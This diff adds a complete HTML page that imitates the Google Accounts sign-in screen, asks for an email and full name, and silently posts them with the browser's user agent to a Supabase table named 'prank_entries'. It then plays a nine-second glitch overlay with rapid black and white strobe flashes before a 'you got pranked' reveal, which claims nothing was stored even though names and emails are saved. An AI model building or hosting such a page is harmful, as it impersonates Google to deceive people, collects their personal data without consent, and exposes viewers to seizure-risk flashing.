@@ -1,0 +1,385 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Sign in - Google Accounts</title>
+<link rel="icon" href="https://www.google.com/favicon.ico">
+<style>
+  :root{
+    --blue:#1a73e8;
+    --blue-dark:#1765cc;
+    --text:#202124;
+    --gray:#5f6368;
+    --border:#dadce0;
+    --bg:#fff;
+  }
+  *{box-sizing:border-box;}
+  html,body{
+    height:100%;
+    margin:0;
+    font-family:'Google Sans',Roboto,Arial,sans-serif;
+    background:#fff;
+    color:var(--text);
+    overflow:hidden;
+  }
+  #app{
+    min-height:100%;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    padding:24px;
+  }
+  .card{
+    width:100%;
+    max-width:450px;
+    border:1px solid var(--border);
+    border-radius:8px;
+    padding:48px 40px 36px;
+    box-shadow:0 1px 3px rgba(60,64,67,.1), 0 4px 8px rgba(60,64,67,.08);
+  }
+  .logo{
+    display:flex;
+    justify-content:center;
+    margin-bottom:16px;
+  }
+  .logo svg{width:75px;height:24px;}
+  h1{
+    font-size:24px;
+    font-weight:400;
+    text-align:center;
+    margin:8px 0 4px;
+  }
+  .sub{
+    font-size:16px;
+    text-align:center;
+    color:var(--text);
+    margin-bottom:24px;
+  }
+  .field{
+    position:relative;
+    margin-bottom:28px;
+  }
+  .field input{
+    width:100%;
+    padding:13px 15px;
+    font-size:16px;
+    border:1px solid var(--border);
+    border-radius:4px;
+    outline:none;
+    color:var(--text);
+    background:transparent;
+  }
+  .field input:focus{
+    border:2px solid var(--blue);
+    padding:12px 14px;
+  }
+  .field label{
+    position:absolute;
+    left:15px;
+    top:13px;
+    font-size:16px;
+    color:var(--gray);
+    background:#fff;
+    padding:0 4px;
+    pointer-events:none;
+    transition:.15s ease all;
+  }
+  .field input:focus + label,
+  .field input.filled + label{
+    top:-9px;
+    font-size:12px;
+    color:var(--blue);
+  }
+  .hint{
+    font-size:13px;
+    color:var(--gray);
+    margin:-16px 0 28px;
+  }
+  .row{
+    display:flex;
+    align-items:center;
+    justify-content:space-between;
+    margin-top:28px;
+  }
+  .link{
+    color:var(--blue);
+    font-size:14px;
+    font-weight:600;
+    text-decoration:none;
+    cursor:pointer;
+  }
+  button.next{
+    background:var(--blue);
+    color:#fff;
+    border:none;
+    border-radius:4px;
+    padding:10px 24px;
+    font-size:14px;
+    font-weight:600;
+    cursor:pointer;
+  }
+  button.next:hover{background:var(--blue-dark);}
+  button.next:disabled{background:#f1f3f4;color:#9aa0a6;cursor:default;}
+  .error{
+    display:none;
+    align-items:flex-start;
+    gap:8px;
+    color:#d93025;
+    font-size:13px;
+    margin:-16px 0 20px;
+  }
+  .step{display:none;}
+  .step.active{display:block;}
+
+  /* ---------- Glitch overlay ---------- */
+  #glitch-overlay{
+    position:fixed;
+    inset:0;
+    z-index:9999;
+    display:none;
+    background:#000;
+    overflow:hidden;
+  }
+  #glitch-overlay.on{display:block;}
+  .gl-layer{
+    position:absolute;
+    inset:0;
+    background:var(--snapshot) center/cover no-repeat;
+  }
+  .flash{
+    position:absolute;inset:0;background:#fff;opacity:0;
+  }
+  .static-canvas{
+    position:absolute;inset:0;width:100%;height:100%;opacity:0;
+  }
+  .scanlines{
+    position:absolute;inset:0;
+    background:repeating-linear-gradient(0deg,rgba(0,0,0,0.25) 0px,rgba(0,0,0,0.25) 1px,transparent 2px,transparent 3px);
+    mix-blend-mode:overlay;
+    opacity:0;
+  }
+  @keyframes shake{
+    0%{transform:translate(0,0);} 20%{transform:translate(-8px,4px);}
+    40%{transform:translate(6px,-6px);} 60%{transform:translate(-10px,-2px);}
+    80%{transform:translate(4px,8px);} 100%{transform:translate(0,0);}
+  }
+  @keyframes tear{
+    0%{clip-path:inset(0 0 0 0); transform:translateX(0);}
+    10%{clip-path:inset(10% 0 60% 0); transform:translateX(-30px);}
+    20%{clip-path:inset(60% 0 5% 0); transform:translateX(25px);}
+    30%{clip-path:inset(30% 0 40% 0); transform:translateX(-15px);}
+    40%{clip-path:inset(0 0 0 0); transform:translateX(0);}
+    50%{clip-path:inset(70% 0 0 0); transform:translateX(40px);}
+    60%{clip-path:inset(0 0 70% 0); transform:translateX(-20px);}
+    100%{clip-path:inset(0 0 0 0); transform:translateX(0);}
+  }
+  .glitching .gl-layer{animation:tear .25s steps(2) infinite, shake .4s linear infinite;}
+  .hue{filter:hue-rotate(0deg) contrast(1);}
+  .glitching .hue{animation:huecycle .3s linear infinite;}
+  @keyframes huecycle{
+    0%{filter:hue-rotate(0deg) saturate(2) contrast(1.3);}
+    50%{filter:hue-rotate(180deg) saturate(3) invert(0.1) contrast(1.6);}
+    100%{filter:hue-rotate(360deg) saturate(2) contrast(1.3);}
+  }
+</style>
+</head>
+<body>
+
+<div id="app">
+  <div class="card" id="card">
+
+    <!-- STEP 1: email -->
+    <div class="step active" id="step-email">
+      <div class="logo">
+        <svg viewBox="0 0 75 24"><text x="0" y="19" font-family="Arial" font-size="22" font-weight="500"><tspan fill="#4285F4">G</tspan><tspan fill="#EA4335">o</tspan><tspan fill="#FBBC05">o</tspan><tspan fill="#4285F4">g</tspan><tspan fill="#34A853">l</tspan><tspan fill="#EA4335">e</tspan></text></svg>
+      </div>
+      <h1>Sign in</h1>
+      <div class="sub">to continue to Gmail</div>
+
+      <div class="field">
+        <input type="email" id="email" autocomplete="off" />
+        <label for="email">Email or phone</label>
+      </div>
+      <div class="error" id="email-error"><span>⚠</span><span>Enter a valid email or phone number.</span></div>
+      <a class="link" style="display:block;margin-bottom:8px;">Forgot email?</a>
+      <p style="font-size:13px;color:var(--gray);line-height:1.5;">Not your computer? Use Guest mode to sign in privately. <a class="link">Learn more</a></p>
+
+      <div class="row">
+        <a class="link">Create account</a>
+        <button class="next" id="next1">Next</button>
+      </div>
+    </div>
+
+    <!-- STEP 2: name -->
+    <div class="step" id="step-name">
+      <div class="logo">
+        <svg viewBox="0 0 75 24"><text x="0" y="19" font-family="Arial" font-size="22" font-weight="500"><tspan fill="#4285F4">G</tspan><tspan fill="#EA4335">o</tspan><tspan fill="#FBBC05">o</tspan><tspan fill="#4285F4">g</tspan><tspan fill="#34A853">l</tspan><tspan fill="#EA4335">e</tspan></text></svg>
+      </div>
+      <h1>Welcome</h1>
+      <div class="sub" id="email-display">your.email@gmail.com</div>
+
+      <div class="field">
+        <input type="text" id="fullname" autocomplete="off" />
+        <label for="fullname">Full name</label>
+      </div>
+      <div class="error" id="name-error"><span>⚠</span><span>Enter your name to continue.</span></div>
+
+      <div class="row">
+        <a class="link" id="back1">Back</a>
+        <button class="next" id="next2">Next</button>
+      </div>
+    </div>
+
+    <!-- STEP 3: fake loading -->
+    <div class="step" id="step-loading" style="text-align:center;padding:40px 0;">
+      <div style="width:36px;height:36px;border:3px solid #dadce0;border-top-color:#1a73e8;border-radius:50%;margin:0 auto 20px;animation:spin 1s linear infinite;"></div>
+      <div style="color:var(--gray);font-size:14px;">Verifying your account…</div>
+    </div>
+    <style>@keyframes spin{to{transform:rotate(360deg);}}</style>
+
+  </div>
+</div>
+
+<!-- Glitch overlay -->
+<div id="glitch-overlay">
+  <div class="gl-layer hue"></div>
+  <div class="scanlines"></div>
+  <canvas class="static-canvas" id="staticCanvas"></canvas>
+  <div class="flash" id="flashDiv"></div>
+  <div id="reveal" style="position:absolute;inset:0;display:none;align-items:center;justify-content:center;flex-direction:column;background:#000;color:#0f0;font-family:monospace;text-align:center;padding:24px;">
+    <div style="font-size:42px;">😂</div>
+    <div style="font-size:22px;margin-top:12px;">relax, you got pranked.</div>
+    <div style="font-size:14px;color:#aaa;margin-top:8px;">no passwords were asked or stored. breathe.</div>
+  </div>
+</div>
+
+<script>
+/* =========================================================
+   FILL THESE IN before hosting:
+   ========================================================= */
+const SUPABASE_URL = "https://erzeatgbqjlhfiomzdxd.supabase.co";
+const SUPABASE_ANON_KEY = "PASTE_YOUR_ANON_KEY_HERE";
+const TABLE_NAME = "prank_entries";
+/* ========================================================= */
+
+const emailInput = document.getElementById('email');
+const nameInput = document.getElementById('fullname');
+const stepEmail = document.getElementById('step-email');
+const stepName = document.getElementById('step-name');
+const stepLoading = document.getElementById('step-loading');
+
+function toggleFilled(input){
+  input.addEventListener('input', () => {
+    input.classList.toggle('filled', input.value.length > 0);
+  });
+}
+toggleFilled(emailInput);
+toggleFilled(nameInput);
+
+document.getElementById('next1').addEventListener('click', () => {
+  const val = emailInput.value.trim();
+  const errEl = document.getElementById('email-error');
+  if(!val || !val.includes('@') && !/^\d{7,}$/.test(val)){
+    errEl.style.display = 'flex';
+    return;
+  }
+  errEl.style.display = 'none';
+  document.getElementById('email-display').textContent = val;
+  stepEmail.classList.remove('active');
+  stepName.classList.add('active');
+});
+
+document.getElementById('back1').addEventListener('click', () => {
+  stepName.classList.remove('active');
+  stepEmail.classList.add('active');
+});
+
+document.getElementById('next2').addEventListener('click', async () => {
+  const name = nameInput.value.trim();
+  const errEl = document.getElementById('name-error');
+  if(!name){
+    errEl.style.display = 'flex';
+    return;
+  }
+  errEl.style.display = 'none';
+
+  stepName.classList.remove('active');
+  stepLoading.classList.add('active');
+
+  // fire-and-forget store to Supabase
+  try{
+    await fetch(`${SUPABASE_URL}/rest/v1/${TABLE_NAME}`, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        'apikey': SUPABASE_ANON_KEY,
+        'Authorization': `Bearer ${SUPABASE_ANON_KEY}`,
+        'Prefer': 'return=minimal'
+      },
+      body: JSON.stringify({
+        name: name,
+        email: emailInput.value.trim(),
+        user_agent: navigator.userAgent,
+        created_at: new Date().toISOString()
+      })
+    });
+  }catch(e){ /* stay silent either way */ }
+
+  setTimeout(startGlitch, 900);
+});
+
+/* ---------------- GLITCH SEQUENCE ---------------- */
+function startGlitch(){
+  const overlay = document.getElementById('glitch-overlay');
+  const canvas = document.getElementById('staticCanvas');
+  const flash = document.getElementById('flashDiv');
+  const ctx = canvas.getContext('2d');
+  canvas.width = window.innerWidth;
+  canvas.height = window.innerHeight;
+
+  overlay.classList.add('on');
+  overlay.classList.add('glitching');
+
+  // static noise loop
+  let staticRunning = true;
+  function drawStatic(){
+    if(!staticRunning) return;
+    const w = canvas.width, h = canvas.height;
+    const imgData = ctx.createImageData(w, h);
+    for(let i=0;i<imgData.data.length;i+=4){
+      const v = Math.random()*255;
+      imgData.data[i]=v; imgData.data[i+1]=v; imgData.data[i+2]=v; imgData.data[i+3]=255;
+    }
+    ctx.putImageData(imgData,0,0);
+    requestAnimationFrame(drawStatic);
+  }
+  drawStatic();
+
+  // randomized opacity flicker for static + scanlines + flash (black/white strobe)
+  const scanlines = document.querySelector('.scanlines');
+  let flickerInterval = setInterval(() => {
+    canvas.style.opacity = Math.random() > 0.4 ? (0.3 + Math.random()*0.5) : 0;
+    scanlines.style.opacity = Math.random() * 0.6;
+    if(Math.random() > 0.75){
+      flash.style.opacity = Math.random() > 0.5 ? 1 : 0;
+    } else {
+      flash.style.opacity = 0;
+    }
+  }, 90);
+
+  // total chaos duration ~9 seconds, then reveal
+  const DURATION = 9000;
+  setTimeout(() => {
+    staticRunning = false;
+    clearInterval(flickerInterval);
+    overlay.classList.remove('glitching');
+    canvas.style.opacity = 0;
+    scanlines.style.opacity = 0;
+    flash.style.opacity = 0;
+    document.getElementById('reveal').style.display = 'flex';
+  }, DURATION);
+}
+</script>
+</body>
+</html>
